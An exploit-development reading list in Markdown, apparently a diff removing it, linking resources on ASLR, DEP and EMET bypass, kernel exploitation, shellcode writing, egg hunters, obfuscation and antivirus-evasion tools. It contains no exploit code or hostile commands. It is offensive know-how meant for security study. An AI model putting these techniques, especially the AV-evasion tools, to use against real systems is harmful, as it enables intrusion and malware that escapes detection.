-* [Exploiting the random number generator to bypass ASLR](https://www.blackhat.com/presentations/bh-europe-09/Fritsch/Blackhat-Europe-2009-Fritsch-Bypassing-aslr-whitepaper.pdf)
-* [Wikipedia on ASLR](https://www.en.wikipedia.org/wiki/Address_space_layout_randomization)
-* [Bypassing Memory Protections: The Future of Exploitation](http://www.usenix.org/events/sec09/tech/slides/sotirov.pdf)
-* [On the Effectiveness of Address-Space Randomization](https://www.stanford.edu/~blp/papers/asrandom.pdf)
-* [Exploiting with linux-gate.so.1](https://web.archive.org/web/20100205151431/milw0rm.com/papers/55)
-* [Circumventing the VA kernel patch For Fun and Profit](https://web.archive.org/web/20090826171410/http://www.milw0rm.com:80/papers/94)
-* [Defeating the Matasano C++ Challenge](https://timetobleed.com/defeating-the-matasano-c-challenge-with-aslr-enabled/)
-* [Bypassing PaX ASLR protection](https://www.phrack.com/issues.html?issue=59&id=9)
-* [Thoughts about ASLR, NX Stack and format string attacks](https://www.nibbles.tuxfamily.org/?p=1190)
-* [Return-into-libc without Function Calls](http://www.cseweb.ucsd.edu/~hovav/dist/geometry.pdf)
-* [Linux ASLR Curiosities. Tavis Ormandy. Julien Tinnes](https://www.cr0.org/paper/to-jt-linux-alsr-leak.pdf)
-* [Fun With Info-Leaks(DEP+ASLR bypass)](https://rh0dev.github.io/blog/2015/fun-with-info-leaks/)/
-	* This article is about information leaks in form of memory disclosures created in Internet Explorer 10 32-bit on Windows 7 64-bit. They are used to bypass full ASLR/DEP to gain remote code execution. While the software containing the bug might not be that popular, it's quite nice what can be done with the bug.
-* [Exploiting Buffer Overflows On Kernels With Aslr Enabled Using Brute Force On The Stack Layer](http://www.securitytube.net/video/273)
-* [Bypassing The Linux Kernel Aslr And Exploiting A Buffer Overflow Vulnerable Application With Ret2esp](http://www.securitytube.net/video/178)
-	* This video tutorial illustrates how to exploit an application vulnerable to buffer overflow under a modern 2.6 Linux kernel with ASLR, bypassing stack layer randomization by search a jmp *%esp inside the executable file and forcing our program to jump there. 
-* [Exploiting A Buffer Overflow Under Linux Kernel 2.6 With Aslr Through Ret2reg](http://www.securitytube.net/video/236)
-	* Linux kernel versions 2.6.x implement ASLR to faexecution of arbitrary code located in the stack segment of a process. Moreover, kernel versions >= 2.6.18 also made the allocation of ld-linux.so.2 dynamic, and recent compilers also tend to avoid the generation of jmp|call *%esp instructions, so the use of a ret2esp technique to exploit a vulnerable application is becoming harder and harder. A way to turn around the problem is analyzing the registers situations just a while before the vulnerable code is executed: very probably one of them points to the address of the vulnerable buffer. All we have to do is searching inside the executable or a static library a ret2reg instruction, where reg is the register pointing to the vulnerable area, and use that as return address.
-* [Pwn2Own  2010  Windows 7  I nternet Explorer 8 exploit](http://vreugdenhilresearch.nl/Pwn2Own-2010-Windows7-InternetExplorer8.pdf)
-
-
-
-
-
-
-
-
-
-
------------------- 
-### <a name="kernelex">Kernel Exploitation</a>
-*[Attacking the Core : Kernel Exploiting Notes](http://phrack.org/issues/64/6.html)
-* [Much ado about NULL: Exploiting a kernel NULL dereference](https://blogs.oracle.com/ksplice/entry/much_ado_about_null_exploiting)
-* [Integer Overflow in FreeBSD Kernel(2002)](http://archives.neohapsis.com/archives/vulnwatch/2003-q1/att-0006/01-pine-cert-20030101.txt.asc)
-* [Post MS06-035 Mailslot DoS Workaround(Kernel Null Ptr Deref)](http://eeyeresearch.typepad.com/blog/2006/08/post_ms06035_ma.html)
-* https://lkml.org/lkml/2010/5/27/490
-* [Attacking the XNU Kernel For Fun And Profit: Part 1](http://blog.qwertyoruiop.com/?p=38)
-	* This blog post is part of a series of posts in which I will discuss several techniques to own XNU, the kernel used by Apple's OS X and iOS. My focus will be on heap-based attacks, such as heap overflows, double frees, use-after-frees and zone confusion.
-
-
-
------------------- 
-### <a name="uaf">Addendum: Use-After-Free</a>
-* [An Introduction to Use After Free Vulnerabilities](https://www.purehacking.com/blog/lloyd-simon/an-introduction-to-use-after-free-vulnerabilities)
-* [Exploit writing tutorial part 11 : Heap Spraying Demystified](https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/)
-* [Part 9: Spraying the Heap [Chapter 2: Use-After-Free] – Finding a needle in a Haystack](https://www.fuzzysecurity.com/tutorials/expDev/11.html)
-
-
------------------- 
-Other:
-* [Overwriting the .dtors section, Juan M. Bello Rivas, 2000](http://seclists.org/bugtraq/2000/Dec/175)
-* [Abusing .CTORS and .DTORS for fun 'n profit, Izik, 2006](http://vxheavens.com/lib/viz00.html)
-* [Large memory management vulnerabilities, Gael Delalleau, 2005](https://cansecwest.com/core05/memory_vulns_delalleau.pdf)
-* [Symlinks and Cryogenic Sleep](http://seclists.org/bugtraq/2000/Jan/16)
-* [Clutching at straws: When you can shift the stack pointer](http://sebug.net/paper/phrack/63/p63-0x0e_Shifting_the_Stack_Pointer.txt)
-* 
-
-
-
-
-
-
-
-
-
-
------------------
-### <a name="shellcode">Writing Shellcode</a>
-* [Shellcoding for Linux and Windows Tutorial - Steve Hannah](http://www.vividmachines.com/shellcode/shellcode.html)
-* [Phrack Magazine Extraction Utility](http://phrack.org/issues/57/18.html) 
-	* writing ia32 alphanumeric shellcode
-* [shellcode tutorials](http://projectshellcode.com/?q=node/12)
-* [Writing Manual Shellcode by Hand](https://www.exploit-db.com/docs/17065.pdf)
-* [English Shellcode](http://web.cs.jhu.edu/~sam/ccs243-mason.pdf)
-	* History indicates that the security community commonly takes a divide-and-conquer approach to battling malware threats: identify the essential and inalienable components of an attack, then develop detection and prevention techniques that directly target one or more of the essential components. This abstraction is evident in much of the literature for buffer overflow attacks including, for instance, stack protection and NOP sled detection. It comes as no surprise then that we approach shellcode detection and prevention in a similar fashion. However, the common belief that components of polymorphic shellcode (e.g., the decoder) cannot reliably be hidden suggests a more implicit and broader assumption that continues to drive contemporary research: namely, that valid and complete representations of shellcode are fundamentally different in structure than benign payloads. While the first tenet of this assumption is philosoph- ically undeniable (i.e., a string of bytes is either shellcode or it is not), truth of the latter claim is less obvious if there exist encoding techniques capable of producing shellcode with features nearly indistinguishable from non-executable content. In this paper, we challenge the assumption that shellcode must conform to superficial and discernible representations. Specifically, we demonstrate a technique for automatically producing English  Shellcode, transforming arbitrary shellcode into a representation that is superficially similar to English prose. The shellcode is completely self-contained - i.e., it does not require an external loader and executes as valid IA32 code)—and can typically be generated in under an hour on commodity hardware. Our primary objective in this paper is to promote discussion and stimulate new ideas for thinking ahead about preventive measures for tackling evolutions in code-injection attacks
-* [Shellcode_Tools](https://github.com/MarioVilas/shellcode_tools)
-	* Miscellaneous tools written in Python, mostly centered around shellcodes.
-		* bin2py: Embed binary files into Python source code.
-		* shellcode2exe: Convert shellcodes into executable files for multiple platforms.
-* [ShellSploit](https://github.com/b3mb4m/shellsploit-framework)
-* [shellnoob](https://github.com/reyammer/shellnoob)
-* A shellcode writing toolkit
-
-##### Finding Opcodes: 
-```
-Methods of finding opcodes:
-* metasploit opcode DB; 
-* memdump; 
-* pvefindaddr - mona.py
-```
-
-#### Egg Hunters
-* [Beta aaKsYS TEAM: EGG HUNTER (Windows)](https://www.exploit-db.com/docs/18482.pdf)
-	* Explanation of egghunters, how they work and a working demonstration on windows.
-* [jmp2it](https://github.com/adamkramer/jmp2it)
-	* This will allow you to transfer EIP control to a specified offset within a file containing shellcode and then pause to support a malware analysis investigation  The file will be mapped to memory and maintain a handle, allowing shellcode to egghunt for second stage payload as would have happened in original loader  Patches / self modifications are dynamically written to jmp2it-flypaper.out
-
-
-
-##### Misc
-* [rex](https://github.com/shellphish/rex)
-	* Shellphish's automated exploitation engine, originally created for the Cyber Grand Challenge. 
-* [Patcherex](https://github.com/shellphish/patcherex)
-	* Shellphish's automated patching engine, originally created for the Cyber Grand Challenge. 
-* [rappel](https://github.com/yrp604/rappel/)
-	* Rappel is a pretty janky assembly REPL. It works by creating a shell ELF, starting it under ptrace, then continiously rewriting/running the .text section, while showing the register states. It's maybe half done right now, and supports Linux x86, amd64, armv7 (no thumb), and armv8 at the moment.(As of Aug 2017)
-* [Shellcode without Sockets](https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440)
-* [Shellcodes database for study cases](http://shell-storm.org/shellcode/)
-
-#### Talks & Presentations
-* [Shellcode Time: Come on Grab Your Friends](http://www.irongeek.com/i.php?page=videos/derbycon4/t116-shellcode-time-come-on-grab-your-friends-wartortell)
-	* Packed shellcode is a common deterrent against reverse engineering. Mainstream software will use it in order to protect intellectual property or prevent software cracking. Malicious binaries and Capture the Flag (CTF) challenges employ packed shellcode to hide their intended functionality. However, creating these binaries is an involved process requiring significant experience with machine language. Due to the complexity of creating packed shellcode, the majority of samples are painstakingly custom-created or encoded with very simple mechanisms, such as a single byte XOR. In order to aid in the creation of packed shellcode and better understand how to reverse engineer it, I created a tool to generate samples of modular packed shellcode. During this talk, I will demonstrate the use of the shellcode creation tool and how to reverse engineer the binaries it creates. I will also demonstrate an automated process for unpacking the binaries that are created.
-
-
-#### Linux Specific
-* [Writing my first shellcode - iptables -P INPUT ACCEPT](https://0day.work/writing-my-first-shellcode-iptables-p-input-accept/)
-
-
-
-
-
-
-#### <a name="winspec"></a>Windows Specific
-##### General
-* [WinAPI for Hackers](https://www.bnxnet.com/wp-content/uploads/2015/01/WinAPIs_for_hackers.pdf)
-
-* [History and Advances in Windows Shellcode - Phrack 2004](http://phrack.org/issues/62/7.html)
-
-##### Tools
-* [sRDI](https://github.com/monoxgas/sRDI)
-	* Shellcode implementation of Reflective DLL Injection. Convert DLLs to position independent shellcode
-* [ShellcodeStdio](https://github.com/jackullrich/ShellcodeStdio)
-	* An extensible framework for easily writing debuggable, compiler optimized, position independent, x86 shellcode for windows platforms.
-* [WinREPL](https://github.com/zerosum0x0/WinREPL)
-	* x86 and x64 assembly "read-eval-print loop" shell for Windows
-
-
-##### Writing it
-* [Writing Win32 Shellcode with VisualStudio](http://winternl.com/2016/05/02/hello-world/)
-	* demonstrating how to write optimized (sort of) Win32 shellcode using Visual Studio’s compiler
-
-
-#### Writeups
-
-Windows Kernel Shellcode on Windows 10
-* [Windows Kernel Shellcode on Windows 10 – Part 1](https://improsec.com/blog//windows-kernel-shellcode-on-windows-10-part-1)
-* [Windows Kernel Shellcode on Windows 10 – Part 2](https://improsec.com/blog//windows-kernel-shellcode-on-windows-10-part-2)
-* [Windows Kernel Shellcode on Windows 10 – Part 3](https://improsec.com/blog//windows-kernel-shellcode-on-windows-10-part-3)
-* [Windows Kernel Shellcode on Windows 10 – Part 4 - There is No Code](https://improsec.com/blog//windows-kernel-shellcode-on-windows-10-part-4-there-is-no-code)
-
-Introduction to Windows Shellcode Development
-* [Introduction to Windows shellcode development – Part 1](https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/)
-* [Introduction to Windows shellcode development – Part 2](https://securitycafe.ro/2015/12/14/introduction-to-windows-shellcode-development-part-2/)
-* [Introduction to Windows shellcode development – Part 3](https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/)
-
-* [Loading and Debugging Windows Kernel Shellcodes with Windbg. Debugging DoublePulsar Shellcode.](https://vallejo.cc/2017/06/23/loading-and-debugging-windows-kernel-shellcodes-with-windbg-debugging-doublepulsar-shellcode/)
-
-
-
-
-
-
-
-
----------------------
-### <a name="tutorials">Tutorials</a>
-* [Modern Windows Exploit Development](http://expdev-kiuhnm.rhcloud.com/download-the-book/)
-* [Bypassing All the Things](https://www.exodusintel.com/files/Aaron_Portnoy-Bypassing_All_Of_The_Things.pdf)
-	* Handholding through Vuln Discovery and Exploitation
-* [Smashing the Browser - From fuzzing to 0day on IE11](https://github.com/demi6od/Smashing_The_Browser)
-* [From fuzzing to 0-day](http://blog.techorganic.com/2014/05/14/from-fuzzing-to-0-day/)
-* [SQL Injection to MIPS Overflows: Part Deux](https://s3.amazonaws.com/zcutlip_storage/SQL%20Injection%20to%20MIPS%20Overflows%20-%20Part%20Deux.pdf)
-	* This paper is a followup to a paper presented at BlackHat USA 2012, entitled SQL Injec0ons to MIPS Overflows: Rooting SOHO Routers." That previous paper described how to combine SQL injection vulnerabili0es with MIPS Linux buffer overflows in order to gain root on Netgear SOHO routers. This paper revisits the MiniDLNA UPnP server that ships on nearly all Netgear routers in order to explore what has changed in the past two years.
-* [Writing a stack-based overflow exploit in Ruby with the help of vulnserver.exe and Spike 2.9](https://cyberandspace.wordpress.com/category/kali-linux/)
-* [From 0-day to exploit Buffer overflow in Belkin N750 (CVE-2014-1635)](https://labs.integrity.pt/articles/from-0-day-to-exploit-buffer-overflow-in-belkin-n750-cve-2014-1635/)
-* [Smashing The Browser: From Vulnerability Discovery To Exploit](https://github.com/demi6od/Smashing_The_Browser)
-	* Goes from introducing a fuzzer to producing an IE11 0day
-
-AVM Fritz!Box root RCE: From Patch to Metasploit Module
-	* [Part 1](http://breaking.systems/blog/2014/04/avm-fritzbox-root-rce-from-patch-to-metasploit-module-i)
-	* [Part 2](http://breaking.systems/blog/2014/04/avm-fritzbox-root-rce-from-patch-to-metasploit-module-ii)
-
-* [Tracking Down Heap Overflows with rr](https://sean.heelan.io/2016/05/31/tracking-down-heap-overflows-with-rr/)
-* [QuickZip Stack BOF 0day: a box of chocolates](https://www.corelan.be/index.php/2010/03/27/quickzip-stack-bof-0day-a-box-of-chocolates/)
-* [Shellcode Debugging with OllyDbg](https://blackc0.de/2014/06/shellcode-debugging-ollydbg/)
-* [Walking Heap using Pydbg](http://www.debasish.in/2015/02/walking-heap-using-pydbg.html)
-	* This is the simplest implementation of HeapWalk() API based on pydbg. Heap walk API enumerates the memory blocks in the specified heap. If you are not very familiar with HeapWalk() API this page has a very good example in C++.
-* [Firmware Exploitation with JEB: Part 1](https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/)
-* [Microsoft Patch Analysis for Exploitation](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t111-microsoft-patch-analysis-for-exploitation-stephen-sims)
-	* Since the early 2000's Microsoft has distributed patches on the second Tuesday of each month. Bad guys, good guys, and many in-between compare the newly released patches to the unpatched version of the files to identify the security fixes. Many organizations take weeks to patch and the faster someone can reverse engineer the patches and get a working exploit written, the more valuable it is as an attack vector. Analysis also allows a researcher to identify common ways that Microsoft fixes bugs which can be used to find 0-days. Microsoft has recently moved to mandatory cumulative patches which introduces complexity in extracting patches for analysis. Join me in this presentation while I demonstrate the analysis of various patches and exploits, as well as the best-known method for modern patch extraction.
-
-
-
-##### Corelan
-* [Exploit writing tutorial part 10 : Chaining DEP with ROP – the Rubik’s[TM] Cube](https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/)
-* [Exploit writing tutorial part 11 : Heap Spraying Demystified](https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/)
-
-###### FuzzySecurity
-* [Part 9: Spraying the Heap [Chapter 2: Use-After-Free] – Finding a needle in a Haystack](https://www.fuzzysecurity.com/tutorials/expDev/11.html)
-
-
-
-
-
-
-
-
-
-
-
-
-
--------------------
-### <a name="avbypass">AV Bypass Methods</a>
-
-
-#### Talks/Presentations
-* [Easy Ways To Bypass Anti-Virus Systems - Attila Marosi -Trooper14](https://www.youtube.com/watch?v=Sl1Sru3OwJ4)
-* [Muts Bypassing AV in Vista/Pissing all over your AV](https://web.archive.org/web/20130514172102/http://www.shmoocon.org/2008/videos/Backtrack%20Demo.mp4)
-* presentation, listed here as it was a bitch finding a live copy
-
-
-
-#### Tools
-* [SideStep](https://github.com/codewatchorg/SideStep)
-* SideStep is yet another tool to bypass anti-virus software. The tool generates Metasploit payloads encrypted using the CryptoPP library (license included), and uses several other techniques to evade AV.
-
-* [UniByAv](https://github.com/Mr-Un1k0d3r/UniByAv)
-* UniByAv is a simple obfuscator that take raw shellcode and generate executable that are Anti-Virus friendly. The obfuscation routine is purely writtend in assembly to remain pretty short and efficient. In a nutshell the application generate a 32 bits xor key and brute force the key at run time then perform the decryption of the actually shellcode.
-
-
-#### Writeups
-* [Learn how to hide your trojans, backdoors, etc from anti virus.](https://www.hellboundhackers.org/articles/read-article.php?article_id=842)
-* [[Virus] Self-modifying code-short overview for beginners](http://phimonlinemoinhat.blogspot.com/2010/12/virus-self-modifying-code-short.html)
-
-
-
-
-
-
-
-
-
--------------------
-### <a name="bypass-ep">Bypassing Exploit Protections/Mitigations & Corresponding literature</a>
-* [A Brief History of Exploit Techniques and Mitigations on Windows](http://www.hick.org/~mmiller/presentations/misc/exploitation_techniques_and_mitigations_on_windows.pdf)
-* [Windows Exploit Protection History/Overview - Compass Security](https://exploit.courses/files/bfh2017/day6/0x60_WindowsExploiting.pdf)
-* [Toward mitigating arbitrary native code execution in Windows 10](https://github.com/Microsoft/MSRC-Security-Research/blob/master/presentations/2017_05_SysScan360_Seattle/SyScan360_Miller_Towards_Mitigating_Arbitrary_Native_Code_Execution.pdf)
-* [Strengthening the Microsoft Edge Sandbox](https://blogs.windows.com/msedgedev/2017/03/23/strengthening-microsoft-edge-sandbox/#Y6ziSVVBqc1TPHFp.97)
-* [Mitigating arbitrary native code execution in Microsoft Edge](https://blogs.windows.com/msedgedev/2017/02/23/mitigating-arbitrary-native-code-execution/#fAlvade7vV0bQrWs.97)
-
-
-
-
-#### Stack Protections
-
-
-##### Reference Material
-* [Stack Smashing Protector](http://wiki.osdev.org/Stack_Smashing_Protector)
-
-
-
-#### DEP/SEHop/ASLR
-* [Fun With Info-Leaks(DEP+ASLR bypass)](https://rh0dev.github.io/blog/2015/fun-with-info-leaks/)/
-	* This article is about information leaks in form of memory disclosures created in Internet Explorer 10 32-bit on Windows 7 64-bit. They are used to bypass full ASLR/DEP to gain remote code execution. While the software containing the bug might not be that popular, it?s quite nice what can be done with the bug.
-* [Bypassing Windows Hardware-enforced Data Execution Prevention Oct 2, 2005](http://www.uninformed.org/?v=2&a=4&t=txt)
-* [Bypassing Windows Hardware-enforced DEP ](http://uninformed.org/?v=all&a=11&t=sumry)
-	* This paper describes a technique that can be used to bypass Windows hardware-enforced Data Execution Prevention (DEP) on default installations of Windows XP Service Pack 2 and Windows 2003 Server Service Pack 1. This technique makes it possible to execute code from regions that are typically non-executable when hardware support is present, such as thread stacks and process heaps. While other techniques have been used to accomplish similar feats, such as returning into NtProtectVirtualMemory, this approach requires no direct reprotecting of memory regions, no copying of arbitrary code to other locations, and does not have issues with NULL bytes. The result is a feasible approach that can be used to easily bypass the enhancements offered by hardware-enforced DEP on Windows in a way that requires very minimal modifications to existing exploits. 
-* [Exploit Writeup on Flash vuln explaining use of ASLR + DEP bypass](http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf)
-* [DEP/ASLR bypass without ROP/JIT](https://cansecwest.com/slides/2013/DEP-ASLR bypass without ROP-JIT.pdf)
-	* [Slides, codes and videos of the talk "DEP/ASLR bypass without ROP/JIT" on CanSecWest 2013](https://github.com/tombkeeper/DEP-and-ASLR-bypass-without-ROP-or-JIT)
-##### Reference Material
-* [Understanding DEP as a mitigation Technology](http://blogs.technet.com/b/srd/archive/2009/06/05/understanding-dep-as-a-mitigation-technology-part-1.aspx)
-* [Preventing the Exploitation of SEH Overwrites](http://uninformed.org/?v=all&a=24&t=sumry)
-	* This paper proposes a technique that can be used to prevent the exploitation of SEH overwrites on 32-bit Windows applications without requiring any recompilation. While Microsoft has attempted to address this attack vector through changes to the exception dispatcher and through enhanced compiler support, such as with /SAFESEH and /GS, the majority of benefits they offer are limited to image files that have been compiled to make use of the compiler enhancements. This limitation means that without all image files being compiled with these enhancements, it may still be possible to leverage an SEH overwrite to gain code execution. In particular, many third-party applications are still vulnerable to SEH overwrites even on the latest versions of Windows because they have not been recompiled to incorporate these enhancements. To that point, the technique described in this paper does not rely on any compile time support and instead can be applied at runtime to existing applications without any noticeable performance degradation. This technique is also backward compatible with all versions of Windows NT+, thus making it a viable and proactive solution for legacy installations. 
-* [Understanding DEP as a mitigation Technology](http://blogs.technet.com/b/srd/archive/2009/06/05/understanding-dep-as-a-mitigation-technology-part-1.aspx)
-* [Preventing the Exploitation of Structured Exception Handler (SEH) Overwrites with SEHOP](http://blogs.technet.com/b/srd/archive/2009/02/02/preventing-the-exploitation-of-seh-overwrites-with-sehop.aspx)
-
-
-
-
-##### Writeups
-* [Defeating the Matasano C++ Challenge with ASLR enabled](http://timetobleed.com/defeating-the-matasano-c-challenge-with-aslr-enabled/)
-
-
-
-#### CFG/EMET
-* [Exploring Control-Flow-Guard in Windows10](http://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf)
-* [Bypassing EMET's EAF with custom shellcode using kernel pointer](https://www.greyhathacker.net/?p=483)
-* [Bypassing EMET 4.1](http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/)
-	* [Paper](https://bromiumlabs.files.wordpress.com/2014/02/bypassing-emet-4-1.pdf)
-* [Disarming and Bypassing EMET 5.1 - OffSec](http://www.offensive-security.com/vulndev/disarming-and-bypassing-emet-5-1/)
-* [Bypassing Microsoft EMET 5.1 . Yet again.](http://blog.sec-consult.com/2014/11/bypassing-microsoft-emet-51-yet-again.html)
-* [Disarming and Bypassing EMET 5.1](https://www.offensive-security.com/vulndev/disarming-and-bypassing-emet-5-1/)
-* [Defeating EMET 5.2 Protections - Part 1](http://casual-scrutiny.blogspot.in/2015/03/defeating-emet-52.html)
-* [Defeating EMET 5.2 Protections - Part 2](http://casual-scrutiny.blogspot.in/2015/03/defeating-emet-52-protections-2.html)
-* [Bypassing EMET 5.2 Protection](http://adsecurity.org/?p=1487)
-* [BYPASSING EMET Export Address Table Access Filtering feature](http://piotrbania.com/all/articles/anti_emet_eaf.txt)
-* [Disarming Control Flow Guard Using Advanced Code Reuse Attacks](https://www.endgame.com/blog/disarming-control-flow-guard-using-advanced-code-reuse-attacks)
-* [BYPASS CONTROL FLOW  GUARD  COMPREHENSIVELY - Zhang Yunhai](https://www.blackhat.com/docs/us-15/materials/us-15-Zhang-Bypass-Control-Flow-Guard-Comprehensively-wp.pdf)
-* [Proposed Windows 10 EAF/EMET "Bypass" for Reflective DLL Injection](https://zerosum0x0.blogspot.com/2017/06/proposed-eafemet-bypass-for-reflective.html?m=1)
-
-##### Reference
-* [Exploit Mitigation Killchain](http://0xdabbad00.com/wp-content/uploads/2013/04/exploit_mitigation_kill_chain.pdf)
-
-
-
-
-
-
-#### DeviceGuard
-* [Bypassing Device Guard with .NET Assembly Compilation Methods](http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html)
-
-
-
-
------------
-### <a name="obfuscation">Obfuscation/Polyglots`</a>
-* [Obfuscating python](https://reverseengineering.stackexchange.com/questions/1943/what-are-the-techniques-and-tools-to-obfuscate-python-programs)
-* [Code segment encryption](http://blog.sevagas.com/?Code-segment-encryption)
-* [Using ARM Inline Assembly and Naked Functions to fool Disassemblers](http://www.evilsocket.net/2015/05/02/using-inline-assembly-and-naked-functions-to-fool-disassemblers/#sthash.Gt6f7f7y.4pLres53.sfju)
-* [X86 Shellcode Obfuscation - Part 1 - breakdev.org](https://breakdev.org/x86-shellcode-obfuscation-part-1/)
-* [Less is More, Exploring Code/Process-less Techniques and Other Weird Machine Methods to Hide Code (and How to Detect Them)](https://cansecwest.com/slides/2014/less%20is%20more3.pptx)
-* [BMP / x86 Polyglot](https://warroom.securestate.com/bmp-x86-polyglot/)
-* [Meterpreter Payload Stage 1 with Obsfuscation and Evasion](https://github.com/lockfale/meterpreterjank)
-
-
-
-
-### <a name="armspec">ARM Specific</a>
-* [armpwn](https://github.com/saelo/armpwn)
-	* Repository to train/learn memory corruption exploitation on the ARM platform. This is the material of a workshop I prepared for my CTF Team.
-* [Too LeJIT to Quit: Extending JIT Spraying to ARM](http://www.internetsociety.org/sites/default/files/09_3_2.pdf)
-
-
-
-
-
-
-
-
-
-
-
-
---------------------
-### <a name="linuxspec">Linux Specific Exploit Development</a>
-* [Pool Blade: A new approach for kernel pool exploitation](https://zdresearch.com/pool-blade-a-new-approach-for-kernel-pool-exploitation/)
-* [64-bit Linux Return-Oriented Programming - Standford](https://crypto.stanford.edu/~blynn/rop/)
-* [Linux ASLR integer overflow: Reducing stack entropy by four](http://hmarco.org/bugs/linux-ASLR-integer-overflow.html)
-	* A bug in Linux ASLR implementation for versions prior to 3.19-rc3 has been found. The issue is that the stack for processes is not properly randomized on some 64 bit architectures due to an integer overflow. This is a writeup of the bug and how to fix it.
-* [Linux GLibC Stack Canary Values](https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/)
-* [Cheating the ELF - Subversive Dynamic Linking to Libraries](http://www.cs.dartmouth.edu/~sergey/cs108/2010/subversiveld.pdf)
-* [Return into Lib(C) Theory Primer(Security-Tube)](http://www.securitytube.net/video/257)
-* [Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)
-* [Resolving the Base Pointer of the Linux Program Interpreter with Shellcode](https://web-beta.archive.org/web/20160720084253/http://howto.hackallthethings.com:80/2015/03/resolving-base-pointer-of-linux-program.html)
-* [rappel](https://github.com/yrp604/rappel/)
-	* Rappel is a pretty janky assembly REPL. It works by creating a shell ELF, starting it under ptrace, then continiously rewriting/running the .text section, while showing the register states. It's maybe half done right now, and supports Linux x86, amd64, armv7 (no thumb), and armv8 at the moment.(As of Aug 2017)
-
-Sensepost Series on Linux Heap Exploitation (Intro level)
-* [Painless intro to the Linux userland heap](https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/)
-* [Linux Heap Exploitation Intro Series: Used and Abused – Use After Free](https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-used-and-abused-use-after-free/)
-* [Linux Heap Exploitation Intro Series: The magicians cape – 1 Byte Overflow](https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-the-magicians-cape-1-byte-overflow/)
-
-
-
-
---------------------
-### <a name="winspec">Windows Specific</a>
-
-#### General
-* [Writing Exploits for Win32 Systems from Scratch](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/)
-* [Windows DLL-Injection basics](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html)
-* [Writing Exploits for Win32 Systems from Scratch](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/)
-* [Portable Executable Injection For Beginners](http://www.malwaretech.com/2013/11/portable-executable-injection-for.html)
-* [ActiveX - Active Exploitation](http://uninformed.org/?v=all&a=41&t=sumry)
-	* This paper provides a general introduction to the topic of understanding security vulnerabilities that affect ActiveX controls. A brief description of how ActiveX controls are exposed to Internet Explorer is given along with an analysis of three example ActiveX vulnerabilities that have been previously disclosed.
-* [Exploiting the Otherwise Non-Exploitable on Windows](http://uninformed.org/?v=all&a=22&t=sumry)
-	* This paper describes a technique that can be applied in certain situations to gain arbitrary code execution through software bugs that would not otherwise be exploitable, such as NULL pointer dereferences. To facilitate this, an attacker gains control of the top-level unhandled exception filter for a process in an indirect fashion. While there has been previous work illustrating the usefulness in gaining control of the top-level unhandled exception filter, Microsoft has taken steps in XPSP2 and beyond, such as function pointer encoding, to prevent attackers from being able to overwrite and control the unhandled exception filter directly. While this security enhancement is a marked improvement, it is still possible for an attacker to gain control of the top-level unhandled exception filter by taking advantage of a design flaw in the way unhandled exception filters are chained. This approach, however, is limited by an attacker's ability to control the chaining of unhandled exception filters, such as through the loading and unloading of DLLs. This does reduce the global impact of this approach; however, there are some interesting cases where it can be immediately applied, such as with Internet Explorer. 
-* [Microsoft Patch Analysis for Exploitation](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t111-microsoft-patch-analysis-for-exploitation-stephen-sims)
-	* Since the early 2000's Microsoft has distributed patches on the second Tuesday of each month. Bad guys, good guys, and many in-between compare the newly released patches to the unpatched version of the files to identify the security fixes. Many organizations take weeks to patch and the faster someone can reverse engineer the patches and get a working exploit written, the more valuable it is as an attack vector. Analysis also allows a researcher to identify common ways that Microsoft fixes bugs which can be used to find 0-days. Microsoft has recently moved to mandatory cumulative patches which introduces complexity in extracting patches for analysis. Join me in this presentation while I demonstrate the analysis of various patches and exploits, as well as the best-known method for modern patch extraction.
-* [Microsoft Patch Analysis for Exploitation Stephen Sims](https://www.youtube.com/watch?v=LHNcBVQF1tM)
-* [Vulnserver](http://www.thegreycorner.com/2010/12/introducing-vulnserver.html)
-	* I have just released a program named Vulnserver - a Windows based threaded TCP server application that is designed to be exploited.
-
-
-
-#### Windows Kernel Exploitation
-* [Windows Kernel Exploitation  101 : Exploiting CVE - 2014 - 4113](https://www.exploit-db.com/docs/39665.pdf)
-* [Windows Kernel-mode Payload Fundamentals](http://uninformed.org/?v=all&a=15&t=sumry)
-* This paper discusses the theoretical and practical implementations of kernel-mode payloads on Windows. At the time of this writing, kernel-mode research is generally regarded as the realm of a few, but it is hoped that documents such as this one will encourage a thoughtful progression of the subject matter. To that point, this paper will describe some of the general techniques and algorithms that may be useful when implementing kernel-mode payloads. Furthermore, the anatomy of a kernel-mode payload will be broken down into four distinct units, known as payload components, and explained in detail. In the end, the reader should walk away with a concrete understanding of the way in which kernel-mode payloads operate on Windows. 
-* [Intro to Windows kernel exploitation 1/N: Kernel Debugging](https://www.whitehatters.academy/intro-to-kernel-exploitation-part-1/)
-* [Intro to Windows kernel exploitation 2/N: HackSys Extremely Vulnerable Driver](https://www.whitehatters.academy/intro-to-windows-kernel-exploitation-2-windows-drivers/)
-* [A Window into Ring0 - Paper](https://labs.mwrinfosecurity.com/publications/a-window-into-ring0/)
